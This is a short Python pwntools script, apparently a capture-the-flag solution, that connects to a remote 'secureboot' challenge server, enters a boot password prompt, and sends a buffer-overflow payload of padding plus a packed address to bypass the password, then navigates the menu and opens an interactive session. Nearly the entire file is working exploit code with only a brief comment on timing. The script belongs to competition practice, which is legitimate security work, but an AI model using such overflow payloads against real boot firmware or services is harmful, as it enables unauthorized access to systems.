from pwn import *
import sys
g_local=0
context(os='linux', arch='amd64')#, log_level='debug')
if g_local:
	sh = process(["/usr/bin/python3", "./run.py"])
else:
	sh = remote("secureboot.ctfcompetition.com", 1337)

sh.recvuntil("\x1b\x5b\x30\x6d\x1b\x5b\x33\x37\x6d\x1b\x5b\x34\x30\x6d")
sh.send("\x1b")
# After some trials,
# I found sending '\x1b' after recieving string above stably enters password interface
# without sending more bytes that might finally end up into password buffer

sh.recvuntil("Password?\r\n")
sh.send('1010' + 'A' * 0x84 + p32(0x7ec18b8 - 32 + 1) + '\r')

sh.send('\x1b[B')
sh.send('\r')
sh.send('\r')
sh.send('\x1b[B')
sh.send(' ')
sh.send('\x1b\x1b')
sh.send('\x1b\x1b')
sh.send('\x1b[B')
sh.send('\x1b[B')
sh.send('\x1b[B')
sh.send('\r')
sh.send('\r')
sh.interactive()